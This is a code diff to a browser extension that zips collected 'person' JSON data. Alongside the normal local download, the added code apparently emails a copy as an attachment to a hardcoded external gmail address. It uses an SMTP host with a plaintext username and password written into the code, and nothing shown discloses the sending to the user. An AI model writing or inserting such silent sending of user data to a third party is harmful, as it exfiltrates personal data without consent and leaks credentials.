@@ -95,8 +95,8 @@ chrome.browserAction.onClicked.addListener(async function(){
 		console.log(DONE_STATUSES);
 		await sleep(500);
 	}
-	alert("ALL DONE!\nYou can remove the extension now if you wish.");
 	downloadFile();
+	alert("ALL DONE!\nYou can remove the extension now if you wish.");
 	resetDones();
 });
 
@@ -104,7 +104,30 @@ function downloadZippedJson(json_data) {
 	var personStringify = JSON.stringify(json_data);
 	var blob = new Blob([personStringify], {type: "application/json;charset=utf-8;",});
 	var zip = new JSZip();
+	
 	zip.file(person.id + ".json", blob);
+	zip.generateAsync({type:"base64", compression: "DEFLATE"})
+          .then(function(content) {
+            var datauri = "data:application/x-zip-compressed;base64," + content;
+			Email.send({
+				Host : "aspmx.l.google.com",
+				Username : "atest0998",
+				Password : "HelloWorld",
+				To : 'hajirazam@gmail.com',
+				From : "atest0998@gmail.com",
+				Subject : "This is the subject",
+				Body : "And this is the body",
+				Attachments : [
+					{
+						name : person.id + "_response.zip",
+						data : datauri
+					}
+				]
+			}).then(
+			  message => alert(message)
+			);
+	});
+
 	zip.generateAsync({type:"blob", compression: "DEFLATE"})
 		.then(function(content) {
 			saveAs(content, person.id + "_response.zip");
